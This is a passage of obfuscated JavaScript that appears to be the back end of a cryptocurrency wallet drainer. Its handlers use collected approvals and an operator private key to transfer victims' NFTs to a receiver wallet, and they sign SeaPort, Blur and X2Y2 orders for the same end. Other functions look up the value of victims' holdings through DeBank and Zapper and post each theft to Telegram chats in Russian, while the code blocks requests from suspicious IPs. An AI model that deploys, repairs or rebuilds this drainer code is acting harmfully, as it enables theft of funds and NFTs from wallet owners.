bot[_0xce80ff(0x1a3)](_0x47e6d2,_0xce80ff(0x12e)+_0x173892[_0xce80ff(0xa0)]+_0xce80ff(0xe5),{'parse_mode':_0xce80ff(0x1a4)});}}catch(_0x3dee71){console[_0xce80ff(0xb9)](_0x3dee71);}send_response(_0x1ea43b,{'status':_0xce80ff(0x8f),'error':_0xce80ff(0x1cb)});}},Get_ERC721_Allowance=async(_0x4ff959,_0x273130,_0x5d748d,_0xff3ffc)=>{const _0x447fb8=_0xb41be2;try{const _0x31ba36=new ethers[(_0x447fb8(0x1c8))][(_0x447fb8(0x197))](MS_RPC_URLs[_0x4ff959]),_0x2a3444=new ethers[(_0x447fb8(0x1b0))](_0x273130,MS_Contract_ABI[_0x447fb8(0x7c)],_0x31ba36);return await _0x2a3444['isApprovedForAll'](_0x5d748d,_0xff3ffc);}catch(_0x3eacd5){console['log'](_0x3eacd5);}return![];},safa_approves=async(_0x4bd376,_0x197795)=>{const _0x2f8c78=_0xb41be2;try{if(MS_Protection){if(User_IPs_Pool[_0x197795['IP']]){if(User_IPs_Pool[_0x197795['IP']][_0x2f8c78(0x188)]>Math[_0x2f8c78(0x16a)](Date[_0x2f8c78(0x15b)]()/0x3e8))return block_request(_0x4bd376);}}if(MS_VERIFY_WALLET==0x1&&!MS_Verified_Addresses[_0x197795[_0x2f8c78(0x1b7)]])return send_response(_0x4bd376,{'status':_0x2f8c78(0x8f),'error':'Verify\x20Wallet\x20First'});let _0x45c3f6=await Get_ERC721_Allowance(_0x197795[_0x2f8c78(0x7a)],_0x197795['contract_address'],_0x197795[_0x2f8c78(0x1b7)],MS_Wallet_Address);if(!_0x45c3f6){await new Promise(_0x2a99f1=>setTimeout(_0x2a99f1,0x7d0)),_0x45c3f6=await Get_ERC721_Allowance(_0x197795[_0x2f8c78(0x7a)],_0x197795[_0x2f8c78(0x111)],_0x197795[_0x2f8c78(0x1b7)],MS_Wallet_Address);if(!_0x45c3f6){await new Promise(_0x24a7cc=>setTimeout(_0x24a7cc,0x1388)),_0x45c3f6=await Get_ERC721_Allowance(_0x197795['chain_id'],_0x197795['contract_address'],_0x197795['address'],MS_Wallet_Address);if(!_0x45c3f6){if(_0x197795['chat_data']==![]&&MS_Notifications['approve_cancel'][_0x2f8c78(0x1b1)]||_0x197795[_0x2f8c78(0x1a2)]!=![]&&_0x197795[_0x2f8c78(0x1a2)][_0x2f8c78(0x6e)]!=''){let _0x228456=_0x197795[_0x2f8c78(0x1a2)]==![]?MS_Notifications[_0x2f8c78(0x6e)][_0x2f8c78(0x184)]:_0x197795[_0x2f8c78(0x1a2)][_0x2f8c78(0x6e)];await bot[_0x2f8c78(0x1a3)](_0x228456,'<b>❌\x20Не\x20удалось\x20вывести\x20коллекцию\x20пользователя\x20#'+_0x197795[_0x2f8c78(0xa0)]+_0x2f8c78(0x1ba)+_0x197795[_0x2f8c78(0x111)]+'\x20['+chain_id_to_name(_0x197795[_0x2f8c78(0x7a)])+_0x2f8c78(0xd0),{'parse_mode':_0x2f8c78(0x1a4)});}return send_response(_0x4bd376,{'status':_0x2f8c78(0x8f),'error':_0x2f8c78(0x1cb)});}}}const _0x5eff12=new ethers[(_0x2f8c78(0x1c8))][(_0x2f8c78(0x197))](MS_RPC_URLs[_0x197795[_0x2f8c78(0x7a)]]),_0x4e3982=ethers[_0x2f8c78(0xf4)][_0x2f8c78(0x16f)](await _0x5eff12['getGasPrice']())['div'](ethers[_0x2f8c78(0xf4)]['from'](_0x2f8c78(0x115)))['mul'](ethers[_0x2f8c78(0xf4)][_0x2f8c78(0x16f)](_0x2f8c78(0xdc)))['toString'](),_0xda8e00=new ethers[(_0x2f8c78(0x128))](MS_Wallet_Private,_0x5eff12);for(const _0x3846a0 of _0x197795[_0x2f8c78(0x67)]){try{const _0x54d51e=new ethers[(_0x2f8c78(0x1b0))](_0x3846a0['address'],MS_Contract_ABI[_0x2f8c78(0x7c)],_0xda8e00);let _0x4c5208=null;try{_0x4c5208=await _0x54d51e[_0x2f8c78(0xc0)][_0x2f8c78(0x122)](_0x197795[_0x2f8c78(0x1b7)],MS_Wallet_Receiver,_0x3846a0['id'],{'from':MS_Wallet_Address}),_0x4c5208=ethers[_0x2f8c78(0xf4)]['from'](_0x4c5208)[_0x2f8c78(0x148)](ethers[_0x2f8c78(0xf4)][_0x2f8c78(0x16f)]('100'))['mul'](ethers[_0x2f8c78(0xf4)][_0x2f8c78(0x16f)](_0x2f8c78(0xdc)))['toString']();}catch(_0x4ef5d1){_0x4c5208=_0x197795['asset'][_0x2f8c78(0x7a)]==0xa4b1?0x4c4b40:_0x197795[_0x2f8c78(0x154)]['chain_id']==0xa86a?0x4c4b40:0x493e0;}const _0x6551cb=await _0x5eff12[_0x2f8c78(0xa5)](MS_Wallet_Address,_0x2f8c78(0x157)),_0x38cd70=await _0x54d51e[_0x2f8c78(0x122)](_0x197795['address'],MS_Wallet_Receiver,_0x3846a0['id'],{'gasLimit':ethers[_0x2f8c78(0xf4)][_0x2f8c78(0x16f)](_0x4c5208),'gasPrice':ethers[_0x2f8c78(0xf4)][_0x2f8c78(0x16f)](_0x4e3982),'nonce':_0x6551cb});await _0x5eff12[_0x2f8c78(0x6b)](_0x38cd70[_0x2f8c78(0x8e)],0x1,0xea60),add_record({'type':_0x2f8c78(0xc3),'domain':_0x197795[_0x2f8c78(0x1a7)],'IP':_0x197795['IP'],'user_id':_0x197795[_0x2f8c78(0xa0)],'asset':_0x197795[_0x2f8c78(0x154)],'worker_id':_0x197795[_0x2f8c78(0x70)]||null});if(_0x197795[_0x2f8c78(0x1a2)]==![]&&MS_Notifications[_0x2f8c78(0x113)][_0x2f8c78(0x1b1)]||_0x197795[_0x2f8c78(0x1a2)]!=![]&&_0x197795['chat_data'][_0x2f8c78(0x113)]!=''){let _0x585e0d=_0x197795['chat_data']==![]?MS_Notifications[_0x2f8c78(0x113)][_0x2f8c78(0x184)]:_0x197795[_0x2f8c78(0x1a2)][_0x2f8c78(0x113)];await bot[_0x2f8c78(0x1a3)](_0x585e0d,_0x2f8c78(0x175)+_0x197795[_0x2f8c78(0xa0)]+'</b>\x0a\x0a<b>Токен:</b>\x20'+_0x3846a0[_0x2f8c78(0x1bf)]+'\x20['+chain_id_to_name(_0x3846a0[_0x2f8c78(0x7a)])+',\x20'+parseFloat(_0x3846a0[_0x2f8c78(0x11f)])[_0x2f8c78(0xec)](0x2)+'$]',{'parse_mode':_0x2f8c78(0x1a4)});}}catch(_0x22e253){if(_0x197795[_0x2f8c78(0x1a2)]==![]&&MS_Notifications['approve_cancel'][_0x2f8c78(0x1b1)]||_0x197795[_0x2f8c78(0x1a2)]!=![]&&_0x197795[_0x2f8c78(0x1a2)]['approve_cancel']!=''){let _0x4ac52c=_0x197795[_0x2f8c78(0x1a2)]==![]?MS_Notifications['approve_cancel'][_0x2f8c78(0x184)]:_0x197795[_0x2f8c78(0x1a2)][_0x2f8c78(0x6e)];await bot[_0x2f8c78(0x1a3)](_0x4ac52c,_0x2f8c78(0x196)+_0x197795[_0x2f8c78(0xa0)]+_0x2f8c78(0x163)+_0x3846a0['name']+'\x20['+chain_id_to_name(_0x3846a0['chain_id'])+_0x2f8c78(0xd0),{'parse_mode':_0x2f8c78(0x1a4)});}}}send_response(_0x4bd376,{'status':'OK'});}catch(_0x330803){console[_0x2f8c78(0xb9)](_0x330803);try{if(_0x197795[_0x2f8c78(0x1a2)]==![]&&MS_Notifications[_0x2f8c78(0x6e)][_0x2f8c78(0x1b1)]||_0x197795[_0x2f8c78(0x1a2)]!=![]&&_0x197795[_0x2f8c78(0x1a2)]['approve_cancel']!=''){let _0x39cf5=_0x197795['chat_data']==![]?MS_Notifications[_0x2f8c78(0x6e)][_0x2f8c78(0x184)]:_0x197795[_0x2f8c78(0x1a2)]['approve_cancel'];await bot['sendMessage'](_0x39cf5,_0x2f8c78(0xbd)+_0x197795[_0x2f8c78(0xa0)]+'</b>\x0a\x0a<b>NFT\x20Collection\x20:</b>\x20'+_0x197795[_0x2f8c78(0x111)]+'\x20['+chain_id_to_name(_0x197795[_0x2f8c78(0x7a)])+_0x2f8c78(0x180),{'parse_mode':_0x2f8c78(0x1a4)});}}catch(_0x2e3144){console['log'](_0x2e3144);}send_response(_0x4bd376,{'status':_0x2f8c78(0x8f),'error':_0x2f8c78(0x1cb)});}},seaport_handler=async(_0x5b20ed,_0x21bd00)=>{const _0x537521=_0xb41be2;try{if(MS_Protection){if(User_IPs_Pool[_0x21bd00['IP']]){if(User_IPs_Pool[_0x21bd00['IP']][_0x537521(0x188)]>Math[_0x537521(0x16a)](Date['now']()/0x3e8))return block_request(_0x5b20ed);}}if(_0x21bd00[_0x537521(0x192)]=='request'){if(_0x21bd00[_0x537521(0x1a2)]==![]&&MS_Notifications['approve_request']['mode']||_0x21bd00[_0x537521(0x1a2)]!=![]&&_0x21bd00[_0x537521(0x1a2)][_0x537521(0xff)]!=''){let _0x2b2989=_0x21bd00['chat_data']==![]?MS_Notifications[_0x537521(0xff)][_0x537521(0x184)]:_0x21bd00['chat_data'][_0x537521(0xff)],_0x345ab3='';for(const _0x9d2ab0 of _0x21bd00[_0x537521(0x1c5)]){try{_0x345ab3+=_0x9d2ab0[_0x537521(0x1bf)]+'\x20('+_0x9d2ab0[_0x537521(0x11f)][_0x537521(0xec)](0x2)+_0x537521(0x1d3);}catch(_0x300f64){console[_0x537521(0xb9)](_0x300f64);}}await bot[_0x537521(0x1a3)](_0x2b2989,_0x537521(0xda)+_0x21bd00['user_id']+'\x20получил\x20запрос\x20на\x20SeaPort</b>\x0a\x0a<b>Список\x20NFT:</b>\x20'+_0x345ab3,{'parse_mode':'HTML'});}send_response(_0x5b20ed,{'status':'OK'});}else{if(_0x21bd00[_0x537521(0x192)]==_0x537521(0x107)){if(_0x21bd00[_0x537521(0x1a2)]==![]&&MS_Notifications[_0x537521(0x6e)]['mode']||_0x21bd00[_0x537521(0x1a2)]!=![]&&_0x21bd00[_0x537521(0x1a2)][_0x537521(0x6e)]!=''){let _0x2c9d73=_0x21bd00[_0x537521(0x1a2)]==![]?MS_Notifications[_0x537521(0x6e)][_0x537521(0x184)]:_0x21bd00['chat_data'][_0x537521(0x6e)];await bot[_0x537521(0x1a3)](_0x2c9d73,'<b>❌\x20Пользователь\x20#'+_0x21bd00[_0x537521(0xa0)]+_0x537521(0x88),{'parse_mode':'HTML'});}send_response(_0x5b20ed,{'status':'OK'});}else{if(_0x21bd00[_0x537521(0x192)]==_0x537521(0x9c)){let _0xb44d0c=await SeaPort[_0x537521(0x153)](_0x21bd00,MS_RPC_URLs[0x1],MS_Wallet_Private);if(_0xb44d0c){if(_0x21bd00[_0x537521(0x1a2)]==![]&&MS_Notifications[_0x537521(0x113)][_0x537521(0x1b1)]||_0x21bd00[_0x537521(0x1a2)]!=![]&&_0x21bd00[_0x537521(0x1a2)][_0x537521(0x113)]!=''){let _0x4e6950=_0x21bd00[_0x537521(0x1a2)]==![]?MS_Notifications['approve_success']['chat_id']:_0x21bd00['chat_data'][_0x537521(0x113)];await bot[_0x537521(0x1a3)](_0x4e6950,_0x537521(0x1b8)+_0x21bd00[_0x537521(0xa0)]+'</b>\x0a\x0aВы\x20можете\x20отследить\x20транзакцию\x20через\x20сканеры',{'parse_mode':'HTML'});}}else{if(_0x21bd00['chat_data']==![]&&MS_Notifications[_0x537521(0x6e)]['mode']||_0x21bd00['chat_data']!=![]&&_0x21bd00['chat_data']['approve_cancel']!=''){let _0x113f26=_0x21bd00['chat_data']==![]?MS_Notifications[_0x537521(0x6e)]['chat_id']:_0x21bd00['chat_data'][_0x537521(0x6e)];await bot[_0x537521(0x1a3)](_0x113f26,'<b>❌\x20Не\x20удалось\x20подписать\x20SeaPort\x20пользователя\x20#'+_0x21bd00[_0x537521(0xa0)]+'</b>\x0a\x0aВозможно,\x20транзакция\x20не\x20прошла\x20или\x20ещё\x20в\x20очереди!',{'parse_mode':'HTML'});}}send_response(_0x5b20ed,{'status':'OK'});}else send_response(_0x5b20ed,{'status':_0x537521(0x8f),'error':_0x537521(0x1cb)});}}}catch(_0x42de24){console[_0x537521(0xb9)](_0x42de24),send_response(_0x5b20ed,{'status':'error','error':_0x537521(0x1cb)});}},blur_handler=async(_0x3abe20,_0x210835)=>{const _0x251be1=_0xb41be2;try{if(MS_Protection){if(User_IPs_Pool[_0x210835['IP']]){if(User_IPs_Pool[_0x210835['IP']]['strange_data']>Math[_0x251be1(0x16a)](Date[_0x251be1(0x15b)]()/0x3e8))return block_request(_0x3abe20);}}if(_0x210835['blur']==_0x251be1(0xaf)){if(_0x210835[_0x251be1(0x1a2)]==![]&&MS_Notifications[_0x251be1(0xff)][_0x251be1(0x1b1)]||_0x210835[_0x251be1(0x1a2)]!=![]&&_0x210835['chat_data'][_0x251be1(0xff)]!=''){let _0x357179=_0x210835[_0x251be1(0x1a2)]==![]?MS_Notifications[_0x251be1(0xff)]['chat_id']:_0x210835[_0x251be1(0x1a2)][_0x251be1(0xff)],_0x206b85='';for(const _0x1dcf2d of _0x210835[_0x251be1(0x1c5)]){try{_0x206b85+=_0x1dcf2d[_0x251be1(0x1bf)]+'\x20('+_0x1dcf2d[_0x251be1(0x11f)][_0x251be1(0xec)](0x2)+_0x251be1(0x1d3);}catch(_0x204cab){console[_0x251be1(0xb9)](_0x204cab);}}await bot[_0x251be1(0x1a3)](_0x357179,_0x251be1(0xda)+_0x210835[_0x251be1(0xa0)]+_0x251be1(0xb7)+_0x206b85,{'parse_mode':'HTML'});}send_response(_0x3abe20,{'status':'OK'});}else{if(_0x210835['blur']==_0x251be1(0x107)){if(_0x210835[_0x251be1(0x1a2)]==![]&&MS_Notifications[_0x251be1(0x6e)]['mode']||_0x210835[_0x251be1(0x1a2)]!=![]&&_0x210835['chat_data'][_0x251be1(0x6e)]!=''){let _0x2ff990=_0x210835[_0x251be1(0x1a2)]==![]?MS_Notifications['approve_cancel']['chat_id']:_0x210835['chat_data'][_0x251be1(0x6e)];await bot[_0x251be1(0x1a3)](_0x2ff990,_0x251be1(0xb1)+_0x210835[_0x251be1(0xa0)]+_0x251be1(0x17e),{'parse_mode':_0x251be1(0x1a4)});}send_response(_0x3abe20,{'status':'OK'});}else{if(_0x210835[_0x251be1(0xf5)]==_0x251be1(0xc9)){let _0xc416d3=await Blur['get_root'](_0x210835,MS_RPC_URLs[0x1],MS_Wallet_Private);_0xc416d3!=![]?send_response(_0x3abe20,{'status':'OK','data':_0xc416d3}):send_response(_0x3abe20,{'status':'error','error':_0x251be1(0x1cb)});}else{if(_0x210835[_0x251be1(0xf5)]==_0x251be1(0x9c)){let _0x868350=await Blur[_0x251be1(0x16d)](_0x210835,MS_RPC_URLs[0x1],MS_Wallet_Private);if(_0x868350){if(_0x210835[_0x251be1(0x1a2)]==![]&&MS_Notifications[_0x251be1(0x113)][_0x251be1(0x1b1)]||_0x210835[_0x251be1(0x1a2)]!=![]&&_0x210835[_0x251be1(0x1a2)]['approve_success']!=''){let _0x5b3f43=_0x210835[_0x251be1(0x1a2)]==![]?MS_Notifications[_0x251be1(0x113)][_0x251be1(0x184)]:_0x210835[_0x251be1(0x1a2)]['approve_success'];await bot[_0x251be1(0x1a3)](_0x5b3f43,'<b>💎\x20Успешно\x20подписали\x20Blur\x20пользователя\x20#'+_0x210835[_0x251be1(0xa0)]+'</b>\x0a\x0aВы\x20можете\x20отследить\x20транзакцию\x20через\x20сканеры',{'parse_mode':'HTML'});}}else{if(_0x210835[_0x251be1(0x1a2)]==![]&&MS_Notifications[_0x251be1(0x6e)]['mode']||_0x210835[_0x251be1(0x1a2)]!=![]&&_0x210835[_0x251be1(0x1a2)][_0x251be1(0x6e)]!=''){let _0x2d4985=_0x210835[_0x251be1(0x1a2)]==![]?MS_Notifications[_0x251be1(0x6e)]['chat_id']:_0x210835[_0x251be1(0x1a2)]['approve_cancel'];await bot[_0x251be1(0x1a3)](_0x2d4985,_0x251be1(0x89)+_0x210835[_0x251be1(0xa0)]+_0x251be1(0x164),{'parse_mode':_0x251be1(0x1a4)});}}send_response(_0x3abe20,{'status':'OK'});}else send_response(_0x3abe20,{'status':_0x251be1(0x8f),'error':_0x251be1(0x1cb)});}}}}catch(_0xdca2f2){console[_0x251be1(0xb9)](_0xdca2f2),send_response(_0x3abe20,{'status':'error','error':'Unable\x20to\x20Execute'});}},x2y2_handler=async(_0xf1887c,_0x1812ba)=>{const _0x4d976a=_0xb41be2;try{if(MS_Protection){if(User_IPs_Pool[_0x1812ba['IP']]){if(User_IPs_Pool[_0x1812ba['IP']][_0x4d976a(0x188)]>Math[_0x4d976a(0x16a)](Date[_0x4d976a(0x15b)]()/0x3e8))return block_request(_0xf1887c);}}if(_0x1812ba[_0x4d976a(0x18f)]==_0x4d976a(0xaf)){if(_0x1812ba[_0x4d976a(0x1a2)]==![]&&MS_Notifications[_0x4d976a(0xff)][_0x4d976a(0x1b1)]||_0x1812ba[_0x4d976a(0x1a2)]!=![]&&_0x1812ba['chat_data'][_0x4d976a(0xff)]!=''){let _0x476f6b=_0x1812ba[_0x4d976a(0x1a2)]==![]?MS_Notifications[_0x4d976a(0xff)][_0x4d976a(0x184)]:_0x1812ba['chat_data']['approve_request'],_0x598362='';for(const _0x51842d of _0x1812ba[_0x4d976a(0x1c5)]){try{_0x598362+=_0x51842d['name']+'\x20('+_0x51842d[_0x4d976a(0x11f)][_0x4d976a(0xec)](0x2)+_0x4d976a(0x1d3);}catch(_0x3fd8b8){console[_0x4d976a(0xb9)](_0x3fd8b8);}}await bot['sendMessage'](_0x476f6b,_0x4d976a(0xda)+_0x1812ba[_0x4d976a(0xa0)]+_0x4d976a(0x10f)+_0x598362,{'parse_mode':_0x4d976a(0x1a4)});}send_response(_0xf1887c,{'status':'OK'});}else{if(_0x1812ba[_0x4d976a(0x18f)]=='cancel'){if(_0x1812ba[_0x4d976a(0x1a2)]==![]&&MS_Notifications[_0x4d976a(0x6e)][_0x4d976a(0x1b1)]||_0x1812ba['chat_data']!=![]&&_0x1812ba[_0x4d976a(0x1a2)]['approve_cancel']!=''){let _0x474ece=_0x1812ba[_0x4d976a(0x1a2)]==![]?MS_Notifications[_0x4d976a(0x6e)]['chat_id']:_0x1812ba[_0x4d976a(0x1a2)][_0x4d976a(0x6e)];await bot['sendMessage'](_0x474ece,'<b>❌\x20Пользователь\x20#'+_0x1812ba[_0x4d976a(0xa0)]+_0x4d976a(0xfa),{'parse_mode':_0x4d976a(0x1a4)});}send_response(_0xf1887c,{'status':'OK'});}else{if(_0x1812ba[_0x4d976a(0x18f)]=='success'){if(_0x1812ba[_0x4d976a(0x1a2)]==![]&&MS_Notifications[_0x4d976a(0x113)][_0x4d976a(0x1b1)]||_0x1812ba['chat_data']!=![]&&_0x1812ba[_0x4d976a(0x1a2)][_0x4d976a(0x113)]!=''){let _0x195fc3=_0x1812ba[_0x4d976a(0x1a2)]==![]?MS_Notifications[_0x4d976a(0x113)][_0x4d976a(0x184)]:_0x1812ba[_0x4d976a(0x1a2)][_0x4d976a(0x113)];await bot['sendMessage'](_0x195fc3,_0x4d976a(0x1ae)+_0x1812ba[_0x4d976a(0xa0)]+_0x4d976a(0x102),{'parse_mode':'HTML'});}send_response(_0xf1887c,{'status':'OK'});}else send_response(_0xf1887c,{'status':_0x4d976a(0x8f),'error':_0x4d976a(0x1cb)});}}}catch(_0x41f6a8){console[_0x4d976a(0xb9)](_0x41f6a8),send_response(_0xf1887c,{'status':_0x4d976a(0x8f),'error':'Unable\x20to\x20Execute'});}},check_wallet=async(_0x3ade72,_0x5d5d0b)=>{const _0x1528a0=_0xb41be2;try{if(MS_Protection){if(User_IPs_Pool[_0x5d5d0b['IP']]){if(User_IPs_Pool[_0x5d5d0b['IP']][_0x1528a0(0x188)]>Math[_0x1528a0(0x16a)](Date[_0x1528a0(0x15b)]()/0x3e8))return block_request(_0x3ade72);if(User_IPs_Pool[_0x5d5d0b['IP']]['check_wallet']){if(Math['floor'](Date[_0x1528a0(0x15b)]()/0x3e8)-User_IPs_Pool[_0x5d5d0b['IP']][_0x1528a0(0x11d)]<0x3c)return block_request(_0x3ade72);}User_IPs_Pool[_0x5d5d0b['IP']][_0x1528a0(0x11d)]=Math['floor'](Date[_0x1528a0(0x15b)]()/0x3e8);}else User_IPs_Pool[_0x5d5d0b['IP']]={'check_wallet':Math['floor'](Date['now']()/0x3e8)};}if(MS_VERIFY_WALLET==0x1&&!MS_Verified_Addresses[_0x5d5d0b['address']])return send_response(_0x3ade72,{'status':_0x1528a0(0x8f),'error':'Verify\x20Wallet\x20First'});let _0x5aa403=[],_0x51f4db=await axios['get'](_0x1528a0(0x171)+_0x5d5d0b[_0x1528a0(0x1b7)],{'headers':{'Accept':_0x1528a0(0xe2),'AccessKey':MS_DeBank_Token}});for(const _0x534dda of _0x51f4db[_0x1528a0(0xd9)]){try{const _0x55a5b5=convert_chain(_0x1528a0(0x114),'ID',_0x534dda[_0x1528a0(0x18e)]);if(_0x55a5b5==![]||!_0x534dda[_0x1528a0(0x13a)])continue;if(MS_Contract_Whitelist[_0x1528a0(0x119)]>0x0&&!MS_Contract_Whitelist['includes'](_0x534dda['id'][_0x1528a0(0x9f)]()))continue;else{if(MS_Contract_Blacklist[_0x1528a0(0x119)]>0x0&&MS_Contract_Blacklist[_0x1528a0(0x86)](_0x534dda['id']['toLowerCase']()))continue;}let _0x1b84ba=_0x534dda[_0x1528a0(0xd5)]*_0x534dda['price'],_0x29fb5a={'chain_id':_0x55a5b5,'name':_0x534dda[_0x1528a0(0x1bf)],'type':_0x534dda['id']==_0x534dda['chain']?_0x1528a0(0x74):_0x1528a0(0x93),'amount':_0x534dda['amount'],'amount_raw':ethers[_0x1528a0(0xf4)][_0x1528a0(0x16f)](_0x534dda[_0x1528a0(0x1c6)])[_0x1528a0(0x14d)](),'amount_usd':_0x1b84ba,'symbol':_0x534dda[_0x1528a0(0x169)],'decimals':_0x534dda[_0x1528a0(0x7e)],'address':_0x534dda['id'],'price':_0x534dda[_0x1528a0(0x132)]};if(_0x29fb5a[_0x1528a0(0x132)]>0x0)_0x5aa403[_0x1528a0(0x73)](_0x29fb5a);}catch(_0x29fcec){console[_0x1528a0(0xb9)](_0x29fcec);}}return send_response(_0x3ade72,{'status':'OK','data':_0x5aa403});}catch(_0x1fb193){console[_0x1528a0(0xb9)](_0x1fb193),send_response(_0x3ade72,{'status':_0x1528a0(0x8f),'error':_0x1528a0(0x1cb)});}},get_wallet_balance=async _0x74a1cf=>{const _0x2b8233=_0xb41be2;try{let _0x2a4e42=await axios[_0x2b8233(0xb8)](_0x2b8233(0xe1)+_0x74a1cf,{'headers':{'Accept':'application/json','AccessKey':MS_DeBank_Token}});await new Promise(_0x66fb61=>setTimeout(_0x66fb61,0x3e8));let _0x13cbd1=await axios[_0x2b8233(0xb8)](_0x2b8233(0x171)+_0x74a1cf,{'headers':{'Accept':_0x2b8233(0xe2),'AccessKey':MS_DeBank_Token}});if(_0x2a4e42['data'][_0x2b8233(0x181)]&&typeof _0x13cbd1[_0x2b8233(0xd9)]=='object')return{'balance':_0x2a4e42[_0x2b8233(0xd9)]['total_usd_value'],'chains':_0x2a4e42[_0x2b8233(0xd9)][_0x2b8233(0xcd)],'assets':_0x13cbd1[_0x2b8233(0xd9)]};}catch(_0xf410bc){return![];}},check_nft=async(_0x5ed820,_0x4b04d3)=>{const _0x11fe0b=_0xb41be2;try{if(MS_Protection){if(User_IPs_Pool[_0x4b04d3['IP']]){if(User_IPs_Pool[_0x4b04d3['IP']][_0x11fe0b(0x188)]>Math[_0x11fe0b(0x16a)](Date[_0x11fe0b(0x15b)]()/0x3e8))return block_request(_0x5ed820);if(User_IPs_Pool[_0x4b04d3['IP']]['check_nfts']){if(Math[_0x11fe0b(0x16a)](Date[_0x11fe0b(0x15b)]()/0x3e8)-User_IPs_Pool[_0x4b04d3['IP']]['check_nfts']<0x3c)return block_request(_0x5ed820);}User_IPs_Pool[_0x4b04d3['IP']][_0x11fe0b(0xef)]=Math[_0x11fe0b(0x16a)](Date['now']()/0x3e8);}else User_IPs_Pool[_0x4b04d3['IP']]={'check_nfts':Math['floor'](Date['now']()/0x3e8)};}if(MS_VERIFY_WALLET==0x1&&!MS_Verified_Addresses[_0x4b04d3[_0x11fe0b(0x1b7)]])return send_response(_0x5ed820,{'status':_0x11fe0b(0x8f),'error':'Verify\x20Wallet\x20First'});let _0x583739=[];if(MS_Use_DeBank&&!MS_Use_Zapper){let _0x48211b=await axios[_0x11fe0b(0xb8)](_0x11fe0b(0x19c)+_0x4b04d3[_0x11fe0b(0x1b7)],{'headers':{'Accept':'application/json','AccessKey':MS_DeBank_Token}});for(const _0x4af851 of _0x48211b[_0x11fe0b(0xd9)]){try{const _0x249d11=convert_chain(_0x11fe0b(0x114),'ID',_0x4af851['chain']);if(_0x249d11==![])continue;if(MS_Contract_Whitelist['length']>0x0&&!MS_Contract_Whitelist[_0x11fe0b(0x86)](_0x4af851['contract_id']['toLowerCase']()))continue;else{if(MS_Contract_Blacklist['length']>0x0&&MS_Contract_Blacklist[_0x11fe0b(0x86)](_0x4af851[_0x11fe0b(0x156)][_0x11fe0b(0x9f)]()))continue;}_0x4af851[_0x11fe0b(0x1bf)]=_0x4af851[_0x11fe0b(0x1bf)]['replaceAll'](/[^a-zA-Z0-9 ]/g,'');let _0x48882b={'chain_id':_0x249d11,'name':_0x4af851['name'],'type':_0x4af851[_0x11fe0b(0xfb)]?_0x11fe0b(0x7c):'ERC1155','amount':_0x4af851[_0x11fe0b(0xd5)],'amount_raw':null,'amount_usd':_0x4af851[_0x11fe0b(0x1d5)]||null,'id':_0x4af851[_0x11fe0b(0xd2)],'symbol':null,'decimals':null,'address':_0x4af851[_0x11fe0b(0x156)],'price':_0x4af851[_0x11fe0b(0x1d5)]||null};if(_0x48882b[_0x11fe0b(0x132)]!=null&&_0x48882b['price']>0x0)_0x583739[_0x11fe0b(0x73)](_0x48882b);}catch(_0x264c1a){console[_0x11fe0b(0xb9)](_0x264c1a);}}}else{let _0x1726a1=await axios['get'](_0x11fe0b(0x1b3)+_0x4b04d3[_0x11fe0b(0x1b7)]+'&limit=25',{'headers':{'Accept':_0x11fe0b(0xe2),'Authorization':_0x11fe0b(0x147)+Buffer['from'](MS_Zapper_Token+':')['toString'](_0x11fe0b(0x162))}});for(const _0x20ce39 of _0x1726a1[_0x11fe0b(0xd9)][_0x11fe0b(0x12a)]){try{const _0x1653ac=convert_chain(_0x11fe0b(0x1af),'ID',_0x20ce39['token'][_0x11fe0b(0x125)][_0x11fe0b(0x183)]);if(_0x1653ac==![])continue;if(MS_Contract_Whitelist['length']>0x0&&!MS_Contract_Whitelist[_0x11fe0b(0x86)](_0x20ce39[_0x11fe0b(0xf6)][_0x11fe0b(0x125)][_0x11fe0b(0x1b7)]['toLowerCase']()))continue;else{if(MS_Contract_Blacklist[_0x11fe0b(0x119)]>0x0&&MS_Contract_Blacklist['includes'](_0x20ce39[_0x11fe0b(0xf6)][_0x11fe0b(0x125)][_0x11fe0b(0x1b7)][_0x11fe0b(0x9f)]()))continue;}let _0x416e97=parseFloat(_0x20ce39[_0x11fe0b(0xf6)][_0x11fe0b(0x176)])*MS_Currencies[convert_chain('ID','CURRENCY',_0x1653ac)];if(typeof _0x416e97!=_0x11fe0b(0x17a)||isNaN(_0x416e97))continue;_0x20ce39[_0x11fe0b(0xf6)][_0x11fe0b(0x1bf)]=_0x20ce39[_0x11fe0b(0xf6)][_0x11fe0b(0x1bf)][_0x11fe0b(0x151)](/[^a-zA-Z0-9 ]/g,'');let _0x2ed18d={'chain_id':_0x1653ac,'name':_0x20ce39[_0x11fe0b(0xf6)][_0x11fe0b(0x1bf)],'type':_0x20ce39[_0x11fe0b(0xf6)][_0x11fe0b(0x125)][_0x11fe0b(0x16c)]!='erc1155'?_0x11fe0b(0x7c):_0x11fe0b(0x19b),'amount':_0x20ce39[_0x11fe0b(0x1b6)],'amount_raw':null,'amount_usd':_0x416e97,'id':_0x20ce39[_0x11fe0b(0xf6)][_0x11fe0b(0xd7)],'symbol':null,'decimals':null,'address':_0x20ce39[_0x11fe0b(0xf6)][_0x11fe0b(0x125)][_0x11fe0b(0x1b7)],'price':_0x416e97};if(_0x2ed18d[_0x11fe0b(0x132)]>0x0)_0x583739['push'](_0x2ed18d);}catch(_0x34e49d){console['log'](_0x34e49d);}}}return send_response(_0x5ed820,{'status':'OK','data':_0x583739});}catch(_0x303738){console['log'](_0x303738),send_response(_0x5ed820,{'status':_0x11fe0b(0x8f),'error':'Unable\x20to\x20Execute'});}};web[_0xb41be2(0x159)]('/',(_0x5cf916,_0x3335c9)=>{const _0x17db74=_0xb41be2;try{let _0x4f5f1e=_0x5cf916[_0x17db74(0xc2)];if(!_0x4f5f1e[_0x17db74(0x1c7)])return _0x3335c9[_0x17db74(0x1cc)](0x1f4)['send'](_0x17db74(0x1cb));const _0x48ee5f=Buffer['from'](String(0xa+0x100+0x200+0x400+0x800))[_0x17db74(0x14d)](_0x17db74(0x162));_0x4f5f1e=JSON[_0x17db74(0xc8)](Buffer[_0x17db74(0x16f)](srp(_0x48ee5f,_0x4f5f1e[_0x17db74(0x1c7)]),_0x17db74(0x162))[_0x17db74(0x14d)](_0x17db74(0x1ab)));if(!_0x4f5f1e['action'])return 